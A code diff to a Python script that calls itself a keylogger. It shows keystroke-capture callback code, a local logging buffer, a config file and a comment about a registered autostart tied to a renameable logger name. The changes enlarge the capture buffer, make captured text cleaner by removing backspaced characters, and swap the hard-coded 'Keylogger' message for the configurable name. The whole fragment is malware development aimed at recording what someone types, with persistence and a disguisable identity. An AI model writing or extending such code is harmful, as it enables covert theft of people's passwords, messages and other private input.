@@ -16,7 +16,7 @@ book_path = 'myBook'
 # Buffer for characters
 line_buffer = ''
 # Buffer Size limit 
-CHAR_LIMIT = 10
+CHAR_LIMIT = 20
 # Config File
 CONFIG_FILE = 'keylogger-config.json'
 # Name of The Logger (Be carefull changeing this may results in unremoveable registered autostart)
@@ -133,6 +133,9 @@ def key_callback(event):
         key_pressed = ' '
     elif event.name == 'enter':
         key_pressed = '\n'
+    elif event.name == 'backspace':
+        if config["exclude-typos"]:
+            line_buffer = line_buffer[:-1]
     else:
         if len(event.name) == 1:
             key_pressed = event.name
@@ -164,7 +167,7 @@ def main():
     line_buffer = line_buffer.removesuffix("E")
     log_local()
     if config["mode"] == 'debug':
-        print("Keylogger stopped.")
+        print(LOGGER_NAME + " stopped.")
     exit()
 
 if __name__ == '__main__':
